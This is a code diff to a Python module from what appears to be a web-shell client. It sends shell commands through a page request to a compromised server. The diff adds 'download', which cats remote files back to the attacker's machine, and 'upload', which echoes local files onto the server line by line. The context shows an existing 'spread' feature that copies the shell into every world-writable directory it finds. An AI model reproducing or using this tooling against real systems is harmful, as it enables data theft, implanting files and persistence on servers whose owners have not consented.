@@ -25,7 +25,7 @@ class ServerInfo(object):
         # adding another command requires editing two modules
         # 1st- define the method here "server_info.py" module
         # then add a logic statment in "executer.py" module
-        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
+        available_commands = "['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread', 'download', 'upload']"
         self.info = \
         '''
         {dashed}
@@ -68,6 +68,32 @@ class ServerInfo(object):
         request_type.cmd = 'find {0} -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {1}'.format(self.source[3], shell_name)
         print request_type.get_page_source().read()
         print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
+
+    # a method for downloading files from the box
+    def download_file(self, rfile_path, lfile_path):
+        request_type.cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo "file"; else echo "dir"; fi; fi'.format(rfile_path)
+        file_type = request_type.get_page_source().read().strip()
+        if file_type == 'file':
+            request_type.cmd = 'cat {}'.format(rfile_path)
+            try:
+                with open(lfile_path, 'w') as dest_file:
+                    dest_file.write(request_type.get_page_source().read().rstrip() + '\n')
+                print '\n[+] Successfully downloaded {0} to {1}'.format(rfile_path, lfile_path)
+            except IOError, e:
+                print '{0}\n[!] {1}{2}'.format(Colors.RED, e, Colors.END)
+        elif file_type == 'dir':
+            print '\n[!] Uploading directories will be implemented soon'
+        else:
+            print 'The file/dir doesm\'t exist or I ain\'t have a permission'
+
+    # a method for uploading files to the box
+    def upload_file(self, lfile_path, rfile_path):
+        with open(lfile_path) as local_file:
+            data_to_upload = local_file.readlines()
+        for line in data_to_upload:
+            request_type.cmd = 'echo {0} >> {1}'.format(line.strip(), rfile_path)
+            request_type.get_page_source()
+        print '\n[+] Successfully uploaded {0} to {1}'.format(lfile_path, rfile_path)
 
 # taking an instance from ServerInfo class
 serverinfo = ServerInfo()
